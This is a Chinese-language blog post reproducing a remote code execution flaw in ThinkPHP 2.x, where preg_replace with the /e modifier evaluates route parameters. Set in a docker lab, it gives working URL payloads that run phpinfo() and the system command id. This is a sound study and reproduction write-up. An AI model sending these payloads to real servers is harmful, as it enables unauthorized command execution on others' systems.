---
title: "ThinkPHP 2.x 任意代码执行漏洞"
date: 2026-10-13 09:02:31
categories:
  - WebSecurity
  - CVE
  - "三方组件"
  - "ThinkPHP"
tags:
  - "ThinkPHP"
  - "代码执行"
  - "漏洞复现"
---
## 漏洞描述

ThinkPHP 2.x 版本中，使用 `preg_replace` 的 `/e` 模式匹配路由：

```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

ThinkPHP 3.0 版本因为 Lite 模式下没有修复该漏洞，也存在这个漏洞。

## 环境搭建

执行如下命令启动 ThinkPHP 2.1 的 Demo 应用：

```bash
docker-compose up -d
```

环境启动后，访问 `http://your-ip:8080/Index/Index` 即可查看到默认页面。

## 漏洞复现

直接访问 `http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D` 即可执行 `phpinfo()`：

![image-20220302144931898](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/framework/images/202203021449975.png)

执行系统命令：

```
http://your-ip:8080/index.php?s=/index/index/name/$%7Bsystem(id)%7D
```

![image-20220302145029395](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/framework/images/202203021450448.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/framework/ThinkPHP-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
